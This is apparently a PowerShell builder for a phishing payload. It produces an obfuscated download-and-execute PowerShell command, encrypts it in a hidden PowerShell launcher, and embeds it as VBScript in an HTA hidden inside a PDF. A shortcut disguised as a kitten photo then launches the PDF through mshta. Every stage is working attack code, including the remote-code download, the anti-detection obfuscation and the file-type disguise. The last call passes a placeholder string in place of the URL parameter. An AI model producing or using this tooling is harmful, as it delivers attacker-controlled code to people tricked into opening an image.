[CmdletBinding()]
param (
    [Parameter()]
    [string]
    $LnkBase = ".\assets\kittycat.jpeg",

    [Parameter()]
    [string]
    $HtaBase = ".\assets\random.pdf",

    [Parameter(Mandatory)]
    [string]
    $Url
)

function Get-RandomStrings {
    param (
        [int32] $Count = 10
    )
    $vars = [System.Collections.Generic.List[string]]::new()
    for ($i = 0; $i -lt $Count; $i++){
        $len = Get-Random -Minimum 2 -Maximum 8
        $var = -join ((65..90) + (97..122) | Get-Random -Count $len | ForEach-Object {[char]$_})
        $vars.Add($var)
    }
    $vars 
}

function Get-RandomWord {
    param (
        [int32]$Count = 1
    )
   Get-Random -InputObject (Get-Content .\assets\words.txt) -Count $Count
}

function Get-MinCount {
    param (
        [int32]$Length
    )
    if ($Length -ge 4){
        [math]::Floor($Length/4)
    } else {
        1
    }
}

function Get-MaxCount {
    param (
        [int32]$Length 
    )
    if ($Length -gt 2){
        [math]::Floor($Length/2)
    } else {
        2
    }
    
}

function Set-RandomUppercase {
    param (
        [string]$String
    )
    $maxCount = Get-MaxCount $String.Length 
    $minCount = Get-MinCount $String.Length
    $randUppercaseCount = ($minCount..$maxCount) | Get-Random -Count 1
    $randUppercaseIndexes = (0..$String.Length) | Get-Random -Count $randUppercaseCount
    $uppercasedCommand = for ($i = 0; $i -lt $String.Length; $i++) {
        if (@($randUppercaseIndexes).Contains($i)){
            if ($String[$i] -cmatch '^[A-Z]$') {
                $String[$i].ToString().ToLower()
            }
            else {
                $String[$i].ToString().ToUpper()
            }
        } else {
            $String[$i]
        }
    }
    -join $uppercasedCommand
}

function Set-RandomQuotes {
    param (
        [string]$String,
        [switch]$Add
    )
    $maxCount = Get-MaxCount $String.Length
    $minCount = Get-MinCount $String.Length
    $randQuoteCount = ($minCount..$maxCount) | Get-Random -Count 1
    $randQuoteIndexes = (1..$String.Length) | Get-Random -Count $randQuoteCount
    $quote = if (!$Add){
        "''"
    } else {
        "'+'"
    }
    $quotedCommand = for ($i = 0; $i -lt $String.Length; $i++){
        if ((@($randQuoteIndexes).Contains($i)) -and !(@(' ', '.', '-', '(') -contains $String[($i-1)])){
            $quote + $String[$i] 
        }
        else {
            $String[$i]
        }
    }
    -join $quotedCommand
}

function New-ObfuscatedDownloader {
    param (
        [string]$Url
    )
    $command = "IEX (New-Object Net.WebClient).('DownloadString')('$Url')"
    $splittedCommand = ($command -split '[()]' | Where-Object {$_ -ne ""}) 
    $randCase = for ($i = 0; $i -lt $splittedCommand.Length; $i++) {
        if ($i -lt $splittedCommand.Length - 1){
            Set-RandomUppercase $splittedCommand[$i]
        }else{ # dont randomize url
            $splittedCommand[$i]
        }
    } 
    $randCase[0] = Set-RandomQuotes $randCase[0]
    $randCase[1] = "(" + $(Set-RandomQuotes $randCase[1]) + ")"
    $randCase[3] = "(" + $(Set-RandomQuotes $randCase[3]  -Add) + ")"
    $randCase[4] = "(" + $randCase[4] + ")"
    -join $randCase
}

function Get-Base64Encoded {
    param (
        [string]$Payload
    )
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Payload)
    [Convert]::ToBase64String($bytes) 
}

function Get-RandomSleep {
    param (
        [int32]$Min,
        [int32]$Max,
        [bool]$VBSyntax = 1
    )
    $condition = Get-Random -Minimum 1000 -Maximum 5000
    $count = Get-Random -Minimum $Min -Maximum $Max
    if ($VBSyntax){
        "if ${condition} then:for i=1 to ${count}::next:"
    }
    else {
        "if ($condition){for(`$i=0;`$i -lt $count;`$i++){continue;}};"
    }
}

function Get-RandomO0Vars {
    param (
        [int32] $Count,
        [int32] $Len = 10
    )
    $base = [Math]::Pow(2,$Len-2)
    $rand = Get-Random -Minimum ($base/(2*$Len)) -Maximum ($base/$Len)
    $start = $base + $rand
    $end = $start+$Count
    $binLength = [Math]::Ceiling([Math]::Log($end,2))
    $binary = for ($i = $start; $i -lt $end; $i++) {
        ,[Convert]::ToString($i, 2).Replace('0', 'O').Replace('1', '0').PadLeft($binLength+1, 'O')
    }
    $binary | Sort-Object ${Get-Random}
}

function Get-Divisors {
    param(
        [int32] $Val
    )
    $divisors = [System.Collections.Generic.List[int]]::new()
    for ($i = 1; $i -le [math]::Sqrt($Val); $i++) {
        if ($Val % $i -eq 0) {
            $divisors.Add($i)
        }
    }
    $divisors
}

function New-FirstStageVBLauncher {
    param (
        [string]$Payload
    )
    # split in chunks of 1 to 4 bytes
    $chunkLen = Get-Random -Minimum 1 -Maximum 4
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload) | ForEach-Object { $_.ToString("x2") }
    $vars = Get-RandomO0Vars -Count (2 * $bytes.Length)
    $varIndex = 0
    $opSymbols = @("+", "-", "*", "/")
    $splittedPayload = for ($i = 0; $i -lt $bytes.Length; $i+=$chunkLen){
        $chunkLen = Get-Random -Minimum 1 -Maximum 4
        if ($chunkLen + $i -gt $bytes.Length){
            $chunkLen = $bytes.Length - $i
        }
        $val = [Int32]::Parse((-join $bytes[$i..($i+$chunkLen-1)]), 'HexNumber')
        $op = Get-Random -Minimum 0 -Maximum 4
        switch ($op) {
            0 { 
                $newVal = Get-Random -Minimum 1 -Maximum $val
                $res = $val - $newVal
                break
             }
            1 {
                $newVal = Get-Random -Minimum 1 -Maximum $val
                $res = $val + $NewVal
                break
            }
            2 {
                $newVal = Get-Divisors -Val $val | Get-Random
                $res = $val / $newVal
                break
            }
            3 {
                $newVal = Get-Random -Minimum 100 -Maximum 500
                $res = $val * $newVal
                break
            }
        }
        @{  
            "var1" = $vars[$varIndex++]
            "value1" = $res
            "var2" = $vars[$varIndex++]
            "value2" = $newVal
            "op" = $opSymbols[$op]
        }
    }
    $words = Get-RandomWord -Count 4
    $contentVar = $words[0]
    $outputVar = $words[1]
    $title = $words[2]
    $index = $words[3]
    $randWords = Get-RandomWord -Count 100 | ForEach-Object {"$_ </br>`n"}
    $assignement = -join ($splittedPayload | ForEach-Object {"$($_.'var1')=$($_.'value1'):$($_.'var2')=$($_.'value2'):"} | Sort-Object {Get-Random})
    $exec = ("$contentVar=" + (-join ($splittedPayload | ForEach-Object {" hex($($_.'var1')$($_.'op')$($_.'var2')) &"}))).TrimEnd(" &")
    $vbScript = [System.Collections.Generic.List[string]]::new()
    $vbScript.Add("${assignement}:")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
    }
    $vbScript.Add("${exec}:")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
    }
    $vbScript.Add("dim $index,${outputvar}:")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
    }
    $vbScript.Add("for $index=1 to len($contentVar) step 2:")
    $vbScript.Add("$outputVar = $outputVar & Chr(CLng(`"&H`" & Mid($contentVar, $index, 2))):next:")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
    }
    $vbScript.Add("execute($outputvar):self.close")
    @"
<html>
<head>
  <title>$title</title>
  <HTA:APPLICATION ID="app"
      BORDER="none"
      SHOWINTASKBAR="no"
      SYSMENU="no"
      SCROLL="no"
      SINGLEINSTANCE="yes"
      WINDOWSTATE="minimize" />
</head>
<body><div>$randWords</div></body>   
<script language="vbscript">
$(-join $vbScript)
</script>
</html>
"@
}

function New-PowershellLauncher {
    param (
        [string] $Payload
    )
    # encode
    $encodedPayload = Get-Base64Encoded -Payload $Payload
    # compress
    $payloadBytes = [Convert]::FromBase64String($encodedPayload)
    $stream = [System.IO.MemoryStream]::new()
    $mode = [System.IO.Compression.CompressionMode]::Compress
    $compressor = [System.IO.Compression.GzipStream]::new($stream,$mode)
    $compressor.Write($payloadBytes, 0, $payloadBytes.Length)
    $compressor.Dispose()
    $compressed = $stream.ToArray()
    $stream.Dispose()
    # encrypt
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.KeySize = 128
    $aes.GenerateKey()
    $encryptor = $aes.CreateEncryptor()
    $IV = $aes.IV
    $encrypted = $encryptor.TransformFinalBlock($compressed, 0, $compressed.Length)
    $key = $aes.Key
    $vars = Get-RandomStrings -Count 10
    $encryptedPayloadVar = $vars[0]; $keyVar = $vars[1]; $aesVar = $vars[2];
    $payloadBytesVar = $vars[3]; $decryptedVar = $vars[4]; $inputStreamVar = $vars[5];
    $outputStreamVar = $vars[6]; $decompressorVar = $vars[7]; $decompressedVar = $vars[8];
    $IVVar = $vars[9]
    # build decryption + decompression powershell block
    $powerShellCmd = [System.Collections.Generic.List[string]]::new()
    $powerShellCmd.Add("`$$encryptedPayloadVar=`'$([Convert]::ToBase64String($encrypted))`';")
    $powerShellCmd.Add("`$$keyVar=`'$([Convert]::ToBase64String($key))`';`$$IVVar=`'$([Convert]::ToBase64String($IV))`';")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("`$$aesVar=[System.Security.Cryptography.AesManaged]::new();`$$aesVar.Mode=[System.Security.Cryptography.CipherMode]::CBC;")
    $powerShellCmd.Add("`$$aesVar.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("`$$aesVar.Key=[Convert]::FromBase64String(`$$keyVar);`$$aesVar.IV=[Convert]::FromBase64String(`$$IVVar);")
    $powerShellCmd.Add("`$$payloadBytesVar=[Convert]::FromBase64String(`$$encryptedPayloadVar);")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("`$$decryptedVar=`$$aesVar.CreateDecryptor().TransformFinalBlock(`$$payloadBytesVar, 0, `$$payloadBytesVar.Length);")
    $powerShellCmd.Add("`$$inputStreamVar=[System.IO.MemoryStream]::new(`$$decryptedVar);")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("`$$decompressorVar=[System.IO.Compression.GzipStream]::new(`$$inputStreamVar,[System.IO.Compression.CompressionMode]::Decompress);")
    $powerShellCmd.Add("`$$outputStreamVar=[System.IO.MemoryStream]::new();`$$decompressorVar.CopyTo(`$$outputStreamVar);")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("`$$decompressorVAr.Dispose();`$$inputStreamVar.Dispose();")
    $powerShellCmd.Add("`$$decompressedVar=[Convert]::ToBase64String(`$$outputStreamVar.ToArray());")
    if (Get-Random -Minimum 0 -Maximum 2) {
        $powerShellCmd.Add((Get-RandomSleep -Min 5000 -Max 50000 -VBSyntax 0))
    }
    $powerShellCmd.Add("$(Set-RandomUppercase -String "powershell.exe") -w 1 -nop -nol -enc `$$decompressedVar;")
    -join $powerShellCmd
}

function New-SecondStageVBLauncher {
    param (
        [string]$Payload
    )
    $vbScript = [System.Collections.Generic.List[string]]::new()
    if (Get-Random -Minimum 0 -Maximum 2) {
        $vbScript.Add((Get-RandomSleep -Min 5000 -Max 50000))
    }
    $vbScript.Add("Set objShell = CreateObject(`"WScript.Shell`"):")
    $vbScript.Add("objShell.Run `"powershell.exe -w 1 -C $Payload`":")
    $vbScript
}

function New-InsertHtaToPDF {
    param (
        [string]$Path,
        [string]$HtaPayload,
        [string]$Dest
    )
    $newPdf = [System.IO.FileStream]::new("$Dest\random.pdf", [System.IO.FileMode]::Create)
    $pdfBytes = [System.IO.File]::ReadAllBytes($Path)
    $pdfText = [System.Text.Encoding]::ASCII.GetString($pdfBytes)
    $insertIndex = $pdfText.IndexOf("`n")
    $newPdf.Write($pdfBytes, 0, $insertIndex)
    # count pdf objects
    $objectsMatches = [regex]::Matches($pdfText, '(\d+)\s+0\s+obj')
    $objCount = ($objectsMatches | ForEach-Object { [int]$_.Groups[1].Value } | Measure-Object -Maximum).Maximum
    # insert object with correct id
$htaObject = @"
`n$($objCount + 1) 0 obj
<< /Filter /FlateDecode /Length $($HtaPayload.Length + 6) >>
stream
$HtaPayload
<!--

endstream
endobj
"@
    $htaBytes = [System.Text.Encoding]::ASCII.GetBytes($htaObject)
    $newPdf.Write($htaBytes, 0, $htaBytes.Length)
    # write old objects
    $xrefMatch = [regex]::Match($pdfText,  "\r?\n+xref\r?\n")
    $newPdf.Write($pdfBytes, $insertIndex + 1, $xrefMatch.Index - $insertIndex)
    $xrefText = [System.Collections.Generic.List[string]]::new()
    $xrefText.Add("xref`r`n0 $($objectsMatches.Count + 2)`r`n")
    $xrefText.Add("0000000000 65535 f `r`n")
    $xrefText.Add("{0:D10} 00000 n `r`n" -f ($insertIndex + 1))
    foreach ($i in (0..($objectsMatches.Count - 1))) {
        $xrefText.Add(("{0:D10} 00000 n `r`n" -f ($objectsMatches[$i].Index + $htaBytes.Length)))
    }
    $xrefBytes = [System.Text.Encoding]::ASCII.GetBytes(-join $xrefText)
    $newPdf.Write($xrefBytes, 0, $xrefBytes.Length)
    $trailerMatch = [regex]::Match($pdfText, "trailer+\r?\n?\s?<<")
    $trailer = -join $pdfText[$trailerMatch.Index..$pdfText.Length]
    $trailerBytes = [System.Text.Encoding]::ASCII.GetBytes($trailer)
    $sizeMatch = [regex]::Match($trailer, "/Size\s+(\d+)")
    $newPdf.Write($trailerBytes, 0, $sizeMatch.Index)
    $newSize = "/Size $($objectsMatches.Count + 2)"
    $newPdf.Write([System.Text.Encoding]::ASCII.GetBytes($newSize), 0, $newSize.Length)
    $startXrefMatch = [regex]::Match($trailer, "startxref+\r?\n?")
    $newPdf.Write($trailerBytes, $sizeMatch.Index + $sizeMatch.Value.Length, $startXrefMatch.Index - ($sizeMatch.Index + $sizeMatch.Value.Length))
    $end = "startxref`n$($xrefMatch.Index + $htaBytes.Length)`n%%EOF"
    $newPdf.Write([System.Text.Encoding]::ASCII.GetBytes($end), 0, $end.Length)
    $newPdf.Close()
}

function New-LnkFile {
    param (
       [string] $Dest,
       [string] $IconPath,
       [string] $Target
    )
    $shell = New-Object -ComObject WScript.Shell
    $lnk = $shell.CreateShortcut("$Dest.lnk")
    $lnk.TargetPath = "C:\Windows\System32\forfiles.exe"
    $lnk.Arguments = "/p . /m $Target /c `"cmd /c mshta $Target`""
    $lnk.IconLocation = $IconPath
    $lnk.Save()
}
$downloader = New-ObfuscatedDownloader -Url ttotot
$psLauncher = New-PowershellLauncher -Payload $downloader
$secondStage = New-SecondStageVBLauncher -Payload $psLauncher
$payload = New-FirstStageVBLauncher -Payload $secondStage
$defaultDir = ".\payload"
if (!(Test-Path -Path $defaultDir -PathType Container)){
    New-Item -ItemType Directory $defaultDir
}
New-InsertHtaToPDF -Path $HtaBase -HtaPayload $payload -Dest .\payload
New-LnkFile -Target random.pdf -Dest .\payload\kittycat.jpeg -IconPath .\assets\kittycat.jpeg